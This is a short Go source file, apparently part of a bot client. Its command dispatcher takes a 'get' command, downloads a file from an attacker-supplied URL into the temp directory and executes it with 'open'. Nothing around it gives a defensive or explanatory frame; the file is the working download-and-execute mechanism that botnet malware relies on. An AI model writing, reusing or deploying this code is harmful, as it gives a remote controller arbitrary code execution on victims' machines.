package BotCommands

import (
	"net/http"
	"os"
	"io"
	"strings"
	"os/exec"
	log "FormatLog"
)

func (botCommand *BotCommand) RunCommand() {
	switch botCommand.MainCommand {
	case "get":
		log.Print("run command", "get with ", botCommand.Arguments)
		commandGetAndRun(botCommand.Arguments[0])

	default:
		log.Print("run command", "I didn't know this commando, sorry")
	}
}

func commandGetAndRun(url string) {
	// file download
	response, err := http.Get(url)
	if err != nil {
		log.Print("get command", "error: ", err)
		return
	}

	defer response.Body.Close()

	// move file to temp directory
	urlSplit := strings.Split(url, "/")
	fileName := urlSplit[len(urlSplit) - 1]

	out, err := os.Create(os.TempDir() + fileName)
	if err != nil {
		log.Print("get command", "error: ", err)
		return
	}

	_, err = io.Copy(out, response.Body)
	if err != nil {
		log.Print("get command", "error: ", err)
		return
	}

	// run file
	cmd := exec.Command("open", out.Name())
	err = cmd.Run()
	if err != nil {
		log.Print("get command", "error: ", err)
	}

	//
	log.Print("get command", "success")
}
